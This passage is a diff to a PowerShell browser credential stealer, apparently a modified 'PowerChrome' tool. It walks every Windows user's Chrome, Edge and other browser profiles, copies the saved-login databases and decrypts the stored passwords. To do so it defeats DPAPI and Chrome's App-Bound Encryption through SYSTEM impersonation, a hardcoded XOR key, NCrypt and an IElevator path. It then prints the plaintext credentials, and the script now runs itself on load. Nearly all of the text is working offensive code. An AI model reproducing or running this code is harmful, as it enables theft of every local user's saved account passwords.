         if ($KeyHandle -ne [IntPtr]::Zero) { [void]$BCryptDestroyKeyFunction.Invoke($KeyHandle) }
         if ($AlgorithmHandle -ne [IntPtr]::Zero) { [void]$BCryptCloseAlgorithmProviderFunction.Invoke($AlgorithmHandle, 0) }
     }
@@ -416,35 +414,28 @@ function DecryptWithAesGcm {
 
 function DecryptWithNCrypt {
     param([byte[]]$InputData)
-
     try {
         $ProviderName = "Microsoft Software Key Storage Provider"
         $KeyName = "Google Chromekey1"
-        $NcryptSilentFlag = 0x40
-
         $ProviderHandle = [IntPtr]::Zero
         $KeyHandle = [IntPtr]::Zero
 
-        $ProviderNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
-        $Status = $NCryptOpenStorageProviderFunction.Invoke([ref]$ProviderHandle, $ProviderNamePointer, 0)
-        [Runtime.InteropServices.Marshal]::FreeHGlobal($ProviderNamePointer)
+        $ProvPtr = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProviderName)
+        $Status = $NCryptOpenStorageProviderFunction.Invoke([ref]$ProviderHandle, $ProvPtr, 0)
+        [Runtime.InteropServices.Marshal]::FreeHGlobal($ProvPtr)
+        if ($Status -ne 0) { return $null }
 
-        if ($Status -ne 0) { throw "NCryptOpenStorageProvider failed: $Status" }
-
-        $KeyNamePointer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($KeyName)
-        $Status = $NCryptOpenKeyFunction.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyNamePointer, 0, 0)
-        [Runtime.InteropServices.Marshal]::FreeHGlobal($KeyNamePointer)
-
-        if ($Status -ne 0) { throw "NCryptOpenKey failed: $Status" }
+        $KeyPtr = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($KeyName)
+        $Status = $NCryptOpenKeyFunction.Invoke($ProviderHandle, [ref]$KeyHandle, $KeyPtr, 0, 0)
+        [Runtime.InteropServices.Marshal]::FreeHGlobal($KeyPtr)
+        if ($Status -ne 0) { return $null }
 
         $OutputSize = 0
-        $Status = $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $null, 0, [ref]$OutputSize, $NcryptSilentFlag)
-
+        $Status = $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $null, 0, [ref]$OutputSize, 0x40)
         if ($Status -ne 0) { return $null }
 
         $OutputBytes = New-Object byte[] $OutputSize
-        $Status = $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $OutputBytes, $OutputBytes.Length, [ref]$OutputSize, $NcryptSilentFlag)
-
+        $Status = $NCryptDecryptFunction.Invoke($KeyHandle, $InputData, $InputData.Length, [IntPtr]::Zero, $OutputBytes, $OutputBytes.Length, [ref]$OutputSize, 0x40)
         if ($Status -ne 0) { return $null }
 
         return $OutputBytes
@@ -455,55 +446,161 @@ function DecryptWithNCrypt {
     }
 }
 
-function HexToBytes {
-    param([string]$HexString)
-    $ByteArray = New-Object byte[] ($HexString.Length / 2)
-    for ($Index = 0; $Index -lt $ByteArray.Length; $Index++) {
-        $ByteArray[$Index] = [System.Convert]::ToByte($HexString.Substring($Index * 2, 2), 16)
+# ======================================================================
+# Parse Chrome Key Blob - Supports ALL flags (1, 2, 3, 33)
+# ======================================================================
+function Parse-ChromeKeyBlob {
+    param([byte[]]$BlobData)
+
+    $Offset = 0
+    $HeaderLen = [BitConverter]::ToInt32($BlobData, $Offset); $Offset += 4
+    $HeaderBytes = $BlobData[$Offset..($Offset + $HeaderLen - 1)]; $Offset += $HeaderLen
+    $ContentLen = [BitConverter]::ToInt32($BlobData, $Offset); $Offset += 4
+    $Flag = $BlobData[$Offset]; $Offset += 1
+
+    $Result = @{
+        Header = $HeaderBytes
+        Flag = $Flag
+        Iv = $null
+        Ciphertext = $null
+        Tag = $null
+        EncryptedAesKey = $null
+        RawContent = $null
     }
-    return $ByteArray
-}
 
-function XorBytes {
-    param([byte[]]$FirstArray, [byte[]]$SecondArray)
-    if ($FirstArray.Length -ne $SecondArray.Length) { throw "Key lengths mismatch" }
-    $ResultArray = New-Object byte[] $FirstArray.Length
-    for ($Index = 0; $Index -lt $FirstArray.Length; $Index++) {
-        $ResultArray[$Index] = $FirstArray[$Index] -bxor $SecondArray[$Index]
+    # Flag 1 or 2: [flag|iv(12)|ciphertext(32)|tag(16)]
+    if ($Flag -eq 1 -or $Flag -eq 2) {
+        $Result.Iv = $BlobData[$Offset..($Offset + 11)]; $Offset += 12
+        $Result.Ciphertext = $BlobData[$Offset..($Offset + 31)]; $Offset += 32
+        $Result.Tag = $BlobData[$Offset..($Offset + 15)]
     }
-    return $ResultArray
-}
-
-function Decrypt-ChromeKeyBlob {
-    param($ParsedData)
-
-    if ($ParsedData.Flag -eq 3) {
-        [byte[]]$XorKey = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
-        Invoke-Impersonate > $null
-
-        try {
-            [byte[]]$DecryptedAesKey = DecryptWithNCrypt -InputData $ParsedData.EncryptedAesKey
-            $XoredAesKey = XorBytes -FirstArray $DecryptedAesKey -SecondArray $XorKey
-            $PlaintextBytes = DecryptWithAesGcm -Key $XoredAesKey -Iv $ParsedData.Iv -Ciphertext $ParsedData.Ciphertext -Tag $ParsedData.Tag
-            return $PlaintextBytes
-        }
-        finally {
-            [void][Advapi32]::RevertToSelf()
-        }
+    # Flag 3: [flag|encrypted_aes_key(32)|iv(12)|ciphertext(32)|tag(16)]
+    elseif ($Flag -eq 3) {
+        $Result.EncryptedAesKey = $BlobData[$Offset..($Offset + 31)]; $Offset += 32
+        $Result.Iv = $BlobData[$Offset..($Offset + 11)]; $Offset += 12
+        $Result.Ciphertext = $BlobData[$Offset..($Offset + 31)]; $Offset += 32
+        $Result.Tag = $BlobData[$Offset..($Offset + 15)]
+    }
+    # Flag 33 (0x21): Chrome 130+ new format - content after flag is encrypted blob for IElevator
+    elseif ($Flag -eq 33) {
+        $RemainingLen = $ContentLen - 1
+        $Result.RawContent = $BlobData[$Offset..($Offset + $RemainingLen - 1)]
     }
     else {
-        throw "Unsupported flag: $($ParsedData.Flag)"
+        throw "Unknown flag: $Flag"
     }
+
+    return New-Object PSObject -Property $Result
 }
 
 # ======================================================================
-# MODIFIED: Get-AllBrowserLoginBlobs - Scans ALL users, ALL browsers, ALL profiles
+# Decrypt Master Key - Supports ALL Chrome versions
 # ======================================================================
+function Decrypt-MasterKey {
+    param(
+        [string]$LocalStatePath,
+        [string]$Browser
+    )
 
+    if (-not (Test-Path $LocalStatePath)) { return $null }
+
+    try {
+        $LocalState = Get-Content $LocalStatePath -Raw -ErrorAction Stop | ConvertFrom-Json
+    }
+    catch { return $null }
+
+    # Try v10 key first (DPAPI user)
+    if ($LocalState.os_crypt.encrypted_key) {
+        try {
+            $EncKey = [Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
+            # Remove "DPAPI" prefix (5 bytes)
+            if ([Text.Encoding]::ASCII.GetString($EncKey[0..4]) -eq "DPAPI") {
+                $EncKey = $EncKey[5..($EncKey.Length - 1)]
+                $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                return @{ Key = $MasterKey; Type = "v10" }
+            }
+        }
+        catch {}
+    }
+
+    # Try v20 ABE key (App-Bound Encryption)
+    if ($LocalState.os_crypt.app_bound_encrypted_key) {
+        try {
+            $AppBoundEnc = [Convert]::FromBase64String($LocalState.os_crypt.app_bound_encrypted_key)
+            
+            if ([Text.Encoding]::ASCII.GetString($AppBoundEnc[0..3]) -ne "APPB") {
+                return $null
+            }
+
+            $EncKeyBlob = $AppBoundEnc[4..($AppBoundEnc.Length - 1)]
+            
+            # First DPAPI unprotect as SYSTEM
+            $WasImpersonated = Invoke-Impersonate
+            
+            try {
+                $First = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKeyBlob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+            }
+            catch {
+                if ($WasImpersonated) { [Advapi32]::RevertToSelf() | Out-Null }
+                return $null
+            }
+
+            if ($WasImpersonated) { [Advapi32]::RevertToSelf() | Out-Null }
+
+            # Second DPAPI unprotect as user
+            $Second = [System.Security.Cryptography.ProtectedData]::Unprotect($First, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+            
+            $Parsed = Parse-ChromeKeyBlob -BlobData $Second
+
+            # Flag 3: Standard ABE
+            if ($Parsed.Flag -eq 3) {
+                [byte[]]$XorKey = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
+                
+                Invoke-Impersonate | Out-Null
+                try {
+                    $DecryptedAesKey = DecryptWithNCrypt -InputData $Parsed.EncryptedAesKey
+                    if (-not $DecryptedAesKey) { throw "NCrypt failed" }
+                    
+                    $XoredKey = XorBytes -a $DecryptedAesKey -b $XorKey
+                    $MasterKey = DecryptWithAesGcm -Key $XoredKey -Iv $Parsed.Iv -Ciphertext $Parsed.Ciphertext -Tag $Parsed.Tag
+                    return @{ Key = $MasterKey; Type = "v20-flag3" }
+                }
+                finally {
+                    [Advapi32]::RevertToSelf() | Out-Null
+                }
+            }
+            # Flag 33: Chrome 130+ IElevator
+            elseif ($Parsed.Flag -eq 33) {
+                try {
+                    $DecryptedKey = [ChromeElevator]::DecryptWithElevator($Parsed.RawContent, $Browser)
+                    return @{ Key = $DecryptedKey; Type = "v20-flag33" }
+                }
+                catch {
+                    # IElevator failed, try alternative method
+                    Write-Host "    [!] IElevator method failed: $($_.Exception.Message)" -ForegroundColor Yellow
+                    return $null
+                }
+            }
+            # Flag 1 or 2
+            elseif ($Parsed.Flag -eq 1 -or $Parsed.Flag -eq 2) {
+                # These require different decryption - usually just DPAPI
+                return @{ Key = $Second; Type = "v20-flag$($Parsed.Flag)" }
+            }
+        }
+        catch {
+            return $null
+        }
+    }
+
+    return $null
+}
+
+# ======================================================================
+# Get All Browser Login Blobs
+# ======================================================================
 function Get-AllBrowserLoginBlobs {
     param([switch]$Verbose)
 
-    # Browser definitions with relative paths from user's AppData\Local
     $BrowserPaths = @{
         "Chrome"   = "Google\Chrome\User Data"
         "Edge"     = "Microsoft\Edge\User Data"
@@ -514,9 +611,7 @@ function Get-AllBrowserLoginBlobs {
         "Vivaldi"  = "Vivaldi\User Data"
     }
 
-    $AllLoginResults = @()
-    
-    # Get all user directories
+    $AllResults = @()
     $UsersPath = "C:\Users"
     $UserDirs = Get-ChildItem -Path $UsersPath -Directory -ErrorAction SilentlyContinue | 
                 Where-Object { $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') }
@@ -524,30 +619,25 @@ function Get-AllBrowserLoginBlobs {
     foreach ($UserDir in $UserDirs) {
         $Username = $UserDir.Name
         $LocalAppData = Join-Path $UserDir.FullName "AppData\Local"
-        
         if (-not (Test-Path $LocalAppData)) { continue }
 
         foreach ($Browser in $BrowserPaths.Keys) {
-            $BrowserUserDataPath = Join-Path $LocalAppData $BrowserPaths[$Browser]
-            
-            if (-not (Test-Path $BrowserUserDataPath)) { continue }
+            $BrowserPath = Join-Path $LocalAppData $BrowserPaths[$Browser]
+            if (-not (Test-Path $BrowserPath)) { continue }
 
-            # Find all profiles (Default, Profile 1, Profile 2, etc.)
+            # Find all profiles
             $Profiles = @()
-            
-            # Check for Default profile
-            $DefaultProfile = Join-Path $BrowserUserDataPath "Default"
+            $DefaultProfile = Join-Path $BrowserPath "Default"
             if (Test-Path $DefaultProfile) { $Profiles += "Default" }
             
-            # Check for numbered profiles
-            $NumberedProfiles = Get-ChildItem -Path $BrowserUserDataPath -Directory -ErrorAction SilentlyContinue | 
-                               Where-Object { $_.Name -match "^Profile \d+$" }
-            foreach ($p in $NumberedProfiles) { $Profiles += $p.Name }
+            Get-ChildItem -Path $BrowserPath -Directory -ErrorAction SilentlyContinue | 
+                Where-Object { $_.Name -match "^Profile \d+$" } | 
+                ForEach-Object { $Profiles += $_.Name }
 
             foreach ($Profile in $Profiles) {
-                $ProfilePath = Join-Path $BrowserUserDataPath $Profile
+                $ProfilePath = Join-Path $BrowserPath $Profile
                 $LoginDataPath = Join-Path $ProfilePath "Login Data"
-                $LocalStatePath = Join-Path $BrowserUserDataPath "Local State"
+                $LocalStatePath = Join-Path $BrowserPath "Local State"
 
                 if (-not (Test-Path $LoginDataPath)) { continue }
 
@@ -555,294 +645,183 @@ function Get-AllBrowserLoginBlobs {
                     Write-Host "[*] Found: $Username -> $Browser -> $Profile" -ForegroundColor Cyan
                 }
 
-                # Extract login blobs
-                $LoginBlobs = Get-LoginBlobsFromPath -LoginDataPath $LoginDataPath -Browser $Browser -Username $Username -Profile $Profile -LocalStatePath $LocalStatePath
-
-                if ($LoginBlobs) {
-                    $AllLoginResults += $LoginBlobs
-                }
+                $Blobs = Get-LoginBlobsFromPath -LoginDataPath $LoginDataPath -Browser $Browser -Username $Username -Profile $Profile -LocalStatePath $LocalStatePath
+                if ($Blobs) { $AllResults += $Blobs }
             }
         }
     }
 
-    return $AllLoginResults
+    return $AllResults
 }
 
 function Get-LoginBlobsFromPath {
-    param(
-        [string]$LoginDataPath,
-        [string]$Browser,
-        [string]$Username,
-        [string]$Profile,
-        [string]$LocalStatePath
-    )
+    param([string]$LoginDataPath, [string]$Browser, [string]$Username, [string]$Profile, [string]$LocalStatePath)
 
-    [int]$SqliteOk = 0
-    [int]$SqliteRow = 100
-    [int]$SqliteOpenReadOnly = 1
-    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_$($Username)_$($Profile)_LoginData_{0}.db" -f ([guid]::NewGuid()))
+    $TempDb = Join-Path $env:TEMP "$([guid]::NewGuid()).db"
+    try { Copy-Item -LiteralPath $LoginDataPath -Destination $TempDb -Force -ErrorAction Stop }
+    catch { return $null }
 
-    try {
-        Copy-Item -LiteralPath $LoginDataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
-    }
-    catch {
+    $DbPtr = [IntPtr]::Zero
+    $StmtPtr = [IntPtr]::Zero
+    $Query = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
+
+    if ($Sqlite3OpenV2.Invoke($TempDb, [ref]$DbPtr, 1, [IntPtr]::Zero) -ne 0) {
+        Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
         return $null
     }
 
-    $DatabasePointer = [IntPtr]::Zero
-    $StatementPointer = [IntPtr]::Zero
-    $LoginSqlQuery = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
-
-    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) {
-        Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
+    if ($Sqlite3PrepareV2.Invoke($DbPtr, $Query, -1, [ref]$StmtPtr, [IntPtr]::Zero) -ne 0) {
+        $Sqlite3Close.Invoke($DbPtr) | Out-Null
+        Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
         return $null
     }
 
-    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $LoginSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) {
-        $Sqlite3Close.Invoke($DatabasePointer) | Out-Null
-        Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
-        return $null
-    }
+    $Results = @()
+    while ($Sqlite3Step.Invoke($StmtPtr) -eq 100) {
+        $ActionPtr = $Sqlite3ColumnText.Invoke($StmtPtr, 0)
+        $OriginPtr = $Sqlite3ColumnText.Invoke($StmtPtr, 1)
+        $UserPtr = $Sqlite3ColumnText.Invoke($StmtPtr, 2)
+        $PassPtr = $Sqlite3ColumnBlob.Invoke($StmtPtr, 3)
+        $PassSize = $Sqlite3ColumnByte.Invoke($StmtPtr, 3)
 
-    $LoginResults = @()
-    while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
-        $ActionUrlPointer = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
-        $OriginUrlPointer = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
-        $UsernamePointer = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
-        $PasswordPointer = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
-        $PasswordSize = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
-
-        $ActionUrl = if ($ActionUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ActionUrlPointer) } else { "" }
-        $OriginUrl = if ($OriginUrlPointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($OriginUrlPointer) } else { "" }
-        $LoginUsername = if ($UsernamePointer -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UsernamePointer) } else { "" }
+        $ActionUrl = if ($ActionPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ActionPtr) } else { "" }
+        $OriginUrl = if ($OriginPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($OriginPtr) } else { "" }
+        $LoginUser = if ($UserPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($UserPtr) } else { "" }
         $Url = if ($ActionUrl) { $ActionUrl } else { $OriginUrl }
         if (-not $Url) { continue }
 
-        $RawPasswordData = @()
-        if ($PasswordSize -gt 0 -and $PasswordPointer -ne [IntPtr]::Zero) {
-            $RawPasswordData = New-Object byte[] $PasswordSize
-            [Runtime.InteropServices.Marshal]::Copy($PasswordPointer, $RawPasswordData, 0, $PasswordSize)
+        $RawPass = @()
+        if ($PassSize -gt 0 -and $PassPtr -ne [IntPtr]::Zero) {
+            $RawPass = New-Object byte[] $PassSize
+            [Runtime.InteropServices.Marshal]::Copy($PassPtr, $RawPass, 0, $PassSize)
         }
+        if ($RawPass.Length -eq 0) { continue }
 
-        if ($RawPasswordData.Length -eq 0) { continue }
+        $Header3 = [Text.Encoding]::ASCII.GetString($RawPass, 0, [Math]::Min(3, $RawPass.Length))
+        $Header5 = [Text.Encoding]::ASCII.GetString($RawPass, 0, [Math]::Min(5, $RawPass.Length))
 
-        $Header3 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(3, $RawPasswordData.Length))
-        $Header5 = [Text.Encoding]::ASCII.GetString($RawPasswordData, 0, [Math]::Min(5, $RawPasswordData.Length))
+        $BlobType = if ($Header5 -eq "DPAPI") { "DPAPI" }
+                    elseif ($Header3 -eq "v10") { "v10" }
+                    elseif ($Header3 -eq "v20") { "v20" }
+                    else { "Unknown" }
 
-        $BlobHeaderType =
-        if ($Header5 -eq "DPAPI") { "DPAPI (legacy)" }
-        elseif ($Header3 -eq "v10") { "v10 (DPAPI user)" }
-        elseif ($Header3 -eq "v20") { "v20 (ABE)" }
-        else { "Unknown" }
-
-        $LoginResults += [PSCustomObject]@{
-            WindowsUser             = $Username
-            Browser                 = $Browser
-            Profile                 = $Profile
-            URL                     = $Url
-            Username                = $LoginUsername
-            BlobHeader              = $BlobHeaderType
-            LocalStatePath          = $LocalStatePath
-            Base64EncryptedPassword = [Convert]::ToBase64String($RawPasswordData)
+        $Results += [PSCustomObject]@{
+            WindowsUser = $Username
+            Browser = $Browser
+            Profile = $Profile
+            URL = $Url
+            Username = $LoginUser
+            BlobType = $BlobType
+            LocalStatePath = $LocalStatePath
+            EncryptedPassword = [Convert]::ToBase64String($RawPass)
         }
     }
 
-    if ($StatementPointer -ne [IntPtr]::Zero) {
-        [void]$Sqlite3Finalize.Invoke($StatementPointer)
-    }
-    if ($DatabasePointer -ne [IntPtr]::Zero) {
-        [void]$Sqlite3Close.Invoke($DatabasePointer)
-    }
+    [void]$Sqlite3Finalize.Invoke($StmtPtr)
+    [void]$Sqlite3Close.Invoke($DbPtr)
+    Start-Sleep -Milliseconds 300
+    Remove-Item $TempDb -Force -ErrorAction SilentlyContinue
 
-    Start-Sleep -Milliseconds 500
-    [GC]::Collect()
-    [GC]::WaitForPendingFinalizers()
-    Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
-
-    return $LoginResults
+    return $Results
 }
 
 # ======================================================================
-# Invoke-PowerChromeAll (Main Function)
+# Main Function
 # ======================================================================
-
 function Invoke-PowerChromeAll {
-    param (
-        [switch]$Verbose,
-        [switch]$HideBanner
-    )
+    param([switch]$Verbose)
 
-    if (-not $HideBanner) {
-        Write-Output @"
+    Write-Output @"
 
-    ____                          ________                            
-   / __ \______      _____  _____/ ____/ /_  _________  ____ ___  ___ 
-  / /_/ / __ \ | /| / / _ \/ ___/ /   / __ \/ ___/ __ \/ __ `__ \/ _ \
- / ____/ /_/ / |/ |/ /  __/ /  / /___/ / / / /  / /_/ / / / / / /  __/
-/_/    \____/|__/|__/\___/_/   \____/_/ /_/_/   \____/_/ /_/ /_/\___/ 
-
-[MODIFIED] All Users / All Browsers / All Profiles
+ ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗    ██████╗  █████╗ ███████╗███████╗
+██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██╔════╝
+██║     ███████║██████╔╝██║   ██║██╔████╔██║█████╗█████╗██████╔╝███████║███████╗███████╗
+██║     ██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝╚════╝██╔═══╝ ██╔══██║╚════██║╚════██║
+╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗    ██║     ██║  ██║███████║███████║
+ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
+                                                                                         
+[Universal] All Users / All Browsers / All Profiles / All Chrome Versions
 
 "@
-    }
 
-    # Check admin rights
     $Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    $IsAdmin = $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    
-    if (-not $IsAdmin) {
-        Write-Output "[-] This script requires Administrator privileges to access all user profiles."
-        Write-Output "[-] Run PowerShell as Administrator and try again."
+    if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Write-Output "[-] Administrator privileges required. Run as Admin!"
         return
     }
 
     Write-Output "[*] Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
-    Write-Output "[*] Scanning all users, browsers, and profiles..."
-    Write-Output ""
+    Write-Output "[*] Scanning all users, browsers, and profiles...`n"
 
-    # Collect all login blobs
-    $AllBrowserData = Get-AllBrowserLoginBlobs -Verbose:$Verbose
+    $AllData = Get-AllBrowserLoginBlobs -Verbose:$Verbose
 
-    if (-not $AllBrowserData -or $AllBrowserData.Count -eq 0) {
-        Write-Output "[-] No browser data found on this system."
+    if (-not $AllData -or $AllData.Count -eq 0) {
+        Write-Output "[-] No browser data found."
         return
     }
 
-    Write-Output "[+] Found $($AllBrowserData.Count) credential entries"
-    Write-Output ""
+    Write-Output "[+] Found $($AllData.Count) credential entries`n"
 
-    # Group by LocalStatePath to decrypt with correct key
-    $GroupedData = $AllBrowserData | Group-Object -Property LocalStatePath
+    $Grouped = $AllData | Group-Object -Property LocalStatePath
+    $AllDecrypted = @()
 
-    $AllDecryptedResults = @()
-
-    foreach ($Group in $GroupedData) {
+    foreach ($Group in $Grouped) {
         $LocalStatePath = $Group.Name
         $Records = $Group.Group
+        $First = $Records[0]
 
-        if (-not (Test-Path $LocalStatePath)) {
-            Write-Output "[-] Local State not found: $LocalStatePath"
+        Write-Output "[*] Processing: $($First.WindowsUser) / $($First.Browser) / $($First.Profile) [$($First.BlobType)]"
+
+        $MasterKeyInfo = Decrypt-MasterKey -LocalStatePath $LocalStatePath -Browser $First.Browser
+
+        if (-not $MasterKeyInfo) {
+            Write-Output "    [-] Failed to get master key"
             continue
         }
 
-        $FirstRecord = $Records[0]
-        $BlobType = $FirstRecord.BlobHeader
+        Write-Output "    [+] Key type: $($MasterKeyInfo.Type)"
+        $MasterKey = $MasterKeyInfo.Key
 
-        Write-Output "[*] Processing: $($FirstRecord.WindowsUser) / $($FirstRecord.Browser) / $($FirstRecord.Profile) [$BlobType]"
-
-        $MasterKey = $null
-
-        # Decrypt master key based on blob type
-        if ($BlobType -eq 'v10 (DPAPI user)') {
-            try {
-                $LocalState = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
-                $EncKey = [Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
-                $EncKey = $EncKey[5..($EncKey.Length - 1)]
-                $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-            }
-            catch {
-                Write-Output "    [-] Failed to decrypt v10 key: $($_.Exception.Message)"
-                continue
-            }
-        }
-        elseif ($BlobType -eq 'v20 (ABE)') {
-            try {
-                $LocalState = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
-                $AppBoundEnc = [Convert]::FromBase64String($LocalState.os_crypt.app_bound_encrypted_key)
-                
-                if ([Text.Encoding]::ASCII.GetString($AppBoundEnc[0..3]) -ne "APPB") {
-                    Write-Output "    [-] Invalid APPB header"
-                    continue
-                }
-
-                $EncKeyBlob = $AppBoundEnc[4..($AppBoundEnc.Length - 1)]
-
-                Invoke-Impersonate > $null
-
-                try {
-                    $First = [System.Security.Cryptography.ProtectedData]::Unprotect($EncKeyBlob, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                }
-                catch {
-                    Write-Output "    [-] First DPAPI unprotect failed"
-                    [Advapi32]::RevertToSelf() | Out-Null
-                    continue
-                }
-
-                [Advapi32]::RevertToSelf() | Out-Null
-
-                $Second = [System.Security.Cryptography.ProtectedData]::Unprotect($First, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                $Parsed = Parse-ChromeKeyBlob -BlobData $Second
-                $MasterKey = Decrypt-ChromeKeyBlob -ParsedData $Parsed
-            }
-            catch {
-                Write-Output "    [-] Failed to decrypt v20 key: $($_.Exception.Message)"
-                continue
-            }
-        }
-        else {
-            Write-Output "    [-] Unsupported blob type: $BlobType"
-            continue
-        }
-
-        if (-not $MasterKey) {
-            Write-Output "    [-] Failed to obtain master key"
-            continue
-        }
-
-        # Decrypt passwords
         foreach ($Record in $Records) {
-            [int]$BlockSize = 16
-            [int]$NonceSize = 12
-            $Raw = [Convert]::FromBase64String($Record.Base64EncryptedPassword)
-            
-            if (-not $Raw -or $Raw.Length -lt ($NonceSize + $BlockSize + 3)) { continue }
+            $Raw = [Convert]::FromBase64String($Record.EncryptedPassword)
+            if ($Raw.Length -lt 31) { continue }
 
             $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
             
-            switch ($Header) {
-                'v10' { $Key = $MasterKey; $Offset = 3 }
-                'v20' { $Key = $MasterKey; $Offset = 3 }
-                default { continue }
-            }
+            $Offset = 0
+            if ($Header -eq 'v10' -or $Header -eq 'v20') { $Offset = 3 }
+            else { continue }
 
             try {
-                $Nonce = $Raw[$Offset..($Offset + $NonceSize - 1)]
-                $Ciphertext = $Raw[($Offset + $NonceSize)..($Raw.Length - $BlockSize - 1)]
-                $Tag = $Raw[($Raw.Length - $BlockSize)..($Raw.Length - 1)]
+                $Nonce = $Raw[$Offset..($Offset + 11)]
+                $Ciphertext = $Raw[($Offset + 12)..($Raw.Length - 17)]
+                $Tag = $Raw[($Raw.Length - 16)..($Raw.Length - 1)]
 
-                $Plain = DecryptWithAesGcm -Key $Key -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
-                $Decoded = [Text.Encoding]::UTF8.GetString($Plain)
+                $Plain = DecryptWithAesGcm -Key $MasterKey -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
+                $Password = [Text.Encoding]::UTF8.GetString($Plain)
 
-                $AllDecryptedResults += [PSCustomObject]@{
-                    WindowsUser = $Record.WindowsUser
-                    Browser     = $Record.Browser
-                    Profile     = $Record.Profile
-                    URL         = $Record.URL
-                    Username    = $Record.Username
-                    Password    = $Decoded
+                $AllDecrypted += [PSCustomObject]@{
+                    User = $Record.WindowsUser
+                    Browser = $Record.Browser
+                    Profile = $Record.Profile
+                    URL = $Record.URL
+                    Username = $Record.Username
+                    Password = $Password
                 }
             }
-            catch {
-                # Silent fail for individual passwords
-            }
+            catch {}
         }
     }
 
-    if ($AllDecryptedResults.Count -gt 0) {
-        Write-Output ""
-        Write-Output "[+] =============================================="
-        Write-Output "[+] DECRYPTED CREDENTIALS ($($AllDecryptedResults.Count) total)"
-        Write-Output "[+] =============================================="
-        Write-Output ""
-        $AllDecryptedResults | Sort-Object WindowsUser, Browser, Profile, URL | Format-Table -AutoSize -Property WindowsUser, Browser, Profile, URL, Username, Password
+    if ($AllDecrypted.Count -gt 0) {
+        Write-Output "`n[+] =========================================="
+        Write-Output "[+] DECRYPTED: $($AllDecrypted.Count) credentials"
+        Write-Output "[+] ==========================================`n"
+        $AllDecrypted | Sort-Object User, Browser, URL | Format-Table -AutoSize
     }
     else {
-        Write-Output ""
-        Write-Output "[-] No credentials could be decrypted."
+        Write-Output "`n[-] No credentials decrypted."
     }
 }
 
-# Export function
-Export-ModuleMember -Function Invoke-PowerChromeAll -ErrorAction SilentlyContinue
+Invoke-PowerChromeAll
